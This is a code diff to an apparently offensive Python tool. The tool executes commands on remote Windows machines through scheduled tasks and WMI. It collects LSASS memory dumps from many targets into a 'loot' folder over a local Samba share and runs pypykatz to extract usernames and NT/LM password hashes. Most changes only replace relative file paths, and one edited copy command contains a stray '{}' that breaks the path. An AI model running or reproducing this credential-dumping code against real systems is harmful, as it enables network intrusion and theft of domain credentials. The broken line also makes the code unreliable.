@@ -62,10 +62,11 @@ reaper_banner = """
     ░  ░      ░        ░  ░      ░        ░  ░     ░  ░            ░  ░   ░  {}                                                                                   
 """.format(color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset)
 
-with open('log.txt', 'a') as f:
+cwd = os.path.abspath(os.path.dirname(__file__))
+
+with open('{}/log.txt'.format(cwd), 'a') as f:
     f.write('{}{}{}'.format('\n', timestamp, '\n'))
     f.close()
-
 
 ################################################# START OF ATEXEC #########################################################################
 class TSCH_EXEC:
@@ -101,7 +102,7 @@ class TSCH_EXEC:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
-            with open('log.txt', 'a') as f:
+            with open('{}/log.txt'.format(cwd), 'a') as f:
                 f.write('{}: {}\n'.format(addr, e))
                 f.close()
             logging.error('{}: {}'.format(addr, e))
@@ -111,7 +112,7 @@ class TSCH_EXEC:
     def doStuff(self, rpctransport, addr):
         def output_callback(data):
             try:
-                with open('log.txt', 'a') as f:
+                with open('{}/log.txt'.format(cwd), 'a') as f:
                     f.write('{}: {}\n'.format(addr, data.decode(CODEC)))
                     f.close()
                 if logging.getLogger().level == logging.DEBUG:
@@ -202,7 +203,7 @@ class TSCH_EXEC:
             (xml_escape(args) if self.__silentCommand is False else " ".join(self.__command.split()[1:])))
         taskCreated = False
         try:
-            with open('log.txt', 'a') as f:
+            with open('{}/log.txt'.format(cwd), 'a') as f:
                 f.write('{}: Creating task \\{}\n'.format(addr, tmpName))
                 f.close()
             if logging.getLogger().level == logging.DEBUG:
@@ -210,7 +211,7 @@ class TSCH_EXEC:
             tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
             taskCreated = True
 
-            with open('log.txt', 'a') as f:
+            with open('{}/log.txt'.format(cwd), 'a') as f:
                 f.write('{}: Running task \\{}\n'.format(addr, tmpName))
                 f.close()
             if logging.getLogger().level == logging.DEBUG:
@@ -236,7 +237,7 @@ class TSCH_EXEC:
                     done = True
                 else:
                     time.sleep(2)
-            with open('log.txt', 'a') as f:
+            with open('{}/log.txt'.format(cwd), 'a') as f:
                 f.write('{}: Deleting task \\{}\n'.format(addr, tmpName))
                 f.close()
             if logging.getLogger().level == logging.DEBUG:
@@ -263,7 +264,7 @@ class TSCH_EXEC:
         while True:
             try:
                 time.sleep(6)
-                with open('log.txt', 'a') as f:
+                with open('{}/log.txt'.format(cwd), 'a') as f:
                     f.write('{}: Attempting to read ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
                     f.close()
                 if logging.getLogger().level == logging.DEBUG:
@@ -282,7 +283,7 @@ class TSCH_EXEC:
                         raise
                 else:
                     raise
-        with open('log.txt', 'a') as f:
+        with open('{}/log.txt'.format(cwd), 'a') as f:
             f.write('{}: Deleting file ADMIN$\\Temp\\{}\n'.format(addr, tmpFileName))
             f.close()
         if logging.getLogger().level == logging.DEBUG:
@@ -323,7 +324,7 @@ class WMIEXEC:
                                             self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
 
             dialect = smbConnection.getDialect()
-            with open('log.txt', 'a') as f:
+            with open('{}/log.txt'.format(cwd), 'a') as f:
                 if dialect == SMB_DIALECT:
                     f.write("{}: SMBv1 dialect used\n".format(addr))
                 elif dialect == SMB2_DIALECT_002:
@@ -362,7 +363,7 @@ class WMIEXEC:
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
-            with open('log.txt', 'a') as f:
+            with open('{}/log.txt'.format(cwd), 'a') as f:
                 f.write('{}: {}\n'.format(addr, str(e)))
                 f.close()
             logging.error('{}: {}'.format(addr, str(e)))
@@ -488,10 +489,10 @@ class RemoteShell(cmd.Cmd):
 
     def send_data(self, data):
         self.execute_remote(data, self.__shell_type)
-        with open('drives.txt', 'a') as f: # writing to a file gets around the issue of multithreading not being easily readable
+        with open('{}/drives.txt'.format(cwd), 'a') as f: # writing to a file gets around the issue of multithreading not being easily readable
             f.write(self.__outputBuffer)
             f.close()
-        with open('log.txt', 'a') as f:
+        with open('{}/log.txt'.format(cwd), 'a') as f:
             f.write(self.__outputBuffer + '\n')
             f.close()
         if logging.getLogger().level == logging.DEBUG:
@@ -708,7 +709,7 @@ def setup_share():
 
     # copy old smb.conf file so its safe
     print("{} Backing up the smb.conf file".format(green_plus))
-    os.system("sudo cp /etc/samba/smb.conf " + os.getcwd() + "/")
+    os.system("sudo cp /etc/samba/smb.conf " + cwd + "/")
     print("{} Making modifications".format(green_plus))
     with open('/etc/samba/smb.conf', 'a') as f:
         f.write(data)
@@ -747,7 +748,7 @@ def exec_netuse(ip, domain):
             import traceback
 
             traceback.print_exc()
-        with open('log.txt', 'a') as f:
+        with open('{}/log.txt'.format(cwd), 'a') as f:
             f.write('{}: {}\n'.format(ip, str(e)))
             f.close()
 
@@ -766,7 +767,7 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                     import traceback
 
                     traceback.print_exc()
-                with open('log.txt', 'a') as f:
+                with open('{}/log.txt'.format(cwd), 'a') as f:
                     f.write('{}: {}\n'.format(addresses[x], str(e)))
                     f.close()
 
@@ -787,12 +788,12 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                             pass
 
                         try:
-                            os.system("sudo cp " + os.getcwd() + "/smb.conf /etc/samba/smb.conf")
+                            os.system("sudo cp " + cwd + "{}/smb.conf /etc/samba/smb.conf")
                         except BaseException as e:
                             pass
 
                         try:
-                            os.system("sudo rm " + os.getcwd() + "/smb.conf")
+                            os.system("sudo rm " + cwd + "/smb.conf")
                         except BaseException as e:
                             pass
 
@@ -807,7 +808,7 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                             pass
 
                         try:
-                            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, os.getcwd(), timestamp))
+                            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
                         except BaseException as e:
                             pass
                         print(
@@ -816,9 +817,9 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                         exit(0)
                 continue
             #end of antilocout check
-            
-    if os.path.isfile('./drives.txt'): # incase they run with localauth to prevent file not found err
-        os.system('sudo rm ./drives.txt')
+
+    if os.path.isfile('{}/drives.txt'.format(cwd)): # incase they run with localauth to prevent file not found err
+        os.system('sudo rm {}/drives.txt'.format(cwd))
     with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
         for ip in addresses:
             if options.localauth:
@@ -829,7 +830,7 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
                 if logging.getLogger().level == logging.DEBUG:
                     import traceback
                     traceback.print_exc()
-                with open('log.txt', 'a') as f:
+                with open('{}/log.txt'.format(cwd), 'a') as f:
                     f.write(str(e) + '\n')
                     f.close()
                 logging.error(str(e))
@@ -839,7 +840,7 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
     outdata = []
     try:
         data = '' # read data that was saved to drives.txt into data
-        with open('drives.txt', 'r') as f:
+        with open('{}/drives.txt'.format(cwd), 'r') as f:
             data = f.read()
             f.close()
         outdata = re.findall('[A-Z][:]', data) # rip out all the A: C: drive letters
@@ -856,8 +857,8 @@ def auto_drive(addresses, domain): # really helpful so you dont have to know whi
         if letter not in inuse_driveletters:
             inuse_driveletters.append(letter)
 
-    if os.path.isfile('./drives.txt'): # cleanup that file
-        os.system('sudo rm ./drives.txt')
+    if os.path.isfile('{}/drives.txt'.format(cwd)): # cleanup that file
+        os.system('sudo rm {}/drives.txt'.format(cwd))
 
     for item in list(map(chr, range(ord('A'), ord('Z') + 1))):
         if item not in inuse_driveletters and item != 'C' and item != 'D':
@@ -888,7 +889,7 @@ def mt_execute(ip): # multithreading requires a function
             import traceback
 
             traceback.print_exc()
-        with open('log.txt', 'a') as f:
+        with open('{}/log.txt'.format(cwd), 'a') as f:
             f.write('{}: {}\n'.format(ip, str(e)))
             f.close()
         logging.error('{}: {}'.format(ip, str(e)))
@@ -901,8 +902,8 @@ if __name__ == '__main__':
         print("[!] This program is Linux only")
         exit(1)
 
-    if (os.path.isdir(os.getcwd() + "/loot") == False):
-        os.makedirs(os.getcwd() + "/loot")
+    if (os.path.isdir(cwd + "/loot") == False):
+        os.makedirs(cwd + "/loot")
 
     print(reaper_banner)
     print(version.BANNER)
@@ -1060,7 +1061,7 @@ if __name__ == '__main__':
         print(command)
         print("")
 
-        with open('log.txt', 'a') as f:
+        with open('{}/log.txt'.format(cwd), 'a') as f:
             f.write('Total targets: {}\n'.format(len(addresses)))
             f.close()
         print('Total targets: {}'.format(len(addresses)))
@@ -1075,7 +1076,7 @@ if __name__ == '__main__':
                     if logging.getLogger().level == logging.DEBUG:
                         import traceback
                         traceback.print_exc()
-                    with open('log.txt', 'a') as f:
+                    with open('{}/log.txt'.format(cwd), 'a') as f:
                         f.write(str(e) + '\n')
                         f.close()
                     logging.error(str(e))
@@ -1084,40 +1085,47 @@ if __name__ == '__main__':
                     continue
 
         time.sleep(2)
-        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, os.getcwd(), timestamp))
+        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
 
-        with open('log.txt', 'a') as f:
-            f.write('Extracted LSA: {}/{}\n'.format(len([name for name in os.listdir("./loot/{}".format(timestamp)) if os.path.isfile(os.path.join("./loot/{}".format(timestamp), name))])-1, len(addresses)))
+        with open('{}/log.txt'.format(cwd), 'a') as f:
+            f.write('Extracted LSA: {}/{}\n'.format(len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))
             f.close()
         #for when you're attacking a lot of targets to quickly see how many we got
-        print('\n{} Total Extracted LSA: {}/{}\n'.format(green_plus, len([name for name in os.listdir("./loot/{}".format(timestamp)) if os.path.isfile(os.path.join("./loot/{}".format(timestamp), name))])-1, len(addresses)))
+        print('\n{} Total Extracted LSA: {}/{}\n'.format(green_plus, len([name for name in os.listdir("{}/loot/{}".format(cwd, timestamp)) if os.path.isfile(os.path.join("{}/loot/{}".format(cwd, timestamp), name))])-1, len(addresses)))
+
+        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
+            os.system('sudo rm {}/drives.txt'.format(cwd))
 
         if options.ap != False:
             print("\n[parsing files]")
-            os.system("python3 -m pypykatz lsa minidump -d ./loot/{}/ -o ./loot/{}/dumped_full.txt".format(timestamp, timestamp))
-            os.system("python3 -m pypykatz lsa -g minidump -d ./loot/{}/ -o ./loot/{}/dumped_full_grep.grep".format(timestamp, timestamp))
-            os.system("echo 'Domain:Username:NT:LM' > ./loot/{}/dumped_msv.txt; grep 'msv' ./loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host' >> ./loot/{}/dumped_msv.txt".format(timestamp, timestamp, timestamp))
+            os.system("python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
+            os.system("python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
+            os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
 
             remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
             if remove_files.lower() == 'y':
-                os.system('sudo rm ./loot/{}/*.dmp'.format(timestamp))
+                os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
 
 
     except KeyboardInterrupt as e:
         logging.error(str(e))
         print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
+
+        if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
+            os.system('sudo rm {}/drives.txt'.format(cwd))
+
         try:
             os.system("sudo systemctl stop smbd")
         except BaseException as e:
             pass
 
         try:
-            os.system("sudo cp " + os.getcwd() + "/smb.conf /etc/samba/smb.conf")
+            os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
         except BaseException as e:
             pass
 
         try:
-            os.system("sudo rm " + os.getcwd() + "/smb.conf")
+            os.system("sudo rm " + cwd + "/smb.conf")
         except BaseException as e:
             pass
 
@@ -1132,7 +1140,7 @@ if __name__ == '__main__':
             pass
 
         try:
-            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, os.getcwd(), timestamp))
+            os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
         except BaseException as e:
             pass
         print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
@@ -1140,18 +1148,21 @@ if __name__ == '__main__':
 
 
     print("{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
+    if os.path.isfile('{}/drives.txt'.format(cwd)): # cleanup that file
+        os.system('sudo rm {}/drives.txt'.format(cwd))
+
     try:
         os.system("sudo systemctl stop smbd")
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo cp " + os.getcwd() + "/smb.conf /etc/samba/smb.conf")
+        os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
     except BaseException as e:
         pass
 
     try:
-        os.system("sudo rm " + os.getcwd() + "/smb.conf")
+        os.system("sudo rm " + cwd + "/smb.conf")
     except BaseException as e:
         pass
 
